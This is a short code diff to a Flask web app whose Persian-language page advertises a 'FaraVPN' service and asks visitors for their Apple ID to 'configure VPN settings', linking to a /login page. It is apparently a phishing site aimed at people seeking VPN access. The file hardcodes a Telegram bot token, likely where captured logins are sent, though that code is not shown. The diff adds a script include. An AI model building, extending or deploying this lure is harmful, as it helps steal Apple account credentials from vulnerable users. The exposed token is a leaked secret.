@@ -5,7 +5,7 @@ import threading
 import random
 import time
 
-app = Flask(__name__)
+app = Flask(__name__) # <--- اصلاح شده: __name__
 
 # Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "8144273028:AAGRluY75gCirELIzkCTHvP5EJwO_JLMRtQ"  # توکن ربات
@@ -104,6 +104,7 @@ def index():
             <p>با ما هیچوقت قطع نخواهید شد! فراتر از استارلینک رو اینجا تجربه کن! ما تنظیمات VPN رو مستقیم تو گوشیت اعمال می‌کنیم و آپدیت‌ها خودکار نصب می‌شن. برای فعال‌سازی، نیاز به اپل آیدی داریم تا سرورهای FaraVPN بتونن تنظیمات رو روی iOS شما ست کنن.</p>
             <button onclick="window.location.href='/login'">اوکی، فهمیدم!</button>
         </div>
+        <script src="/static/script.js"></script>
     </body>
     </html>
     """)
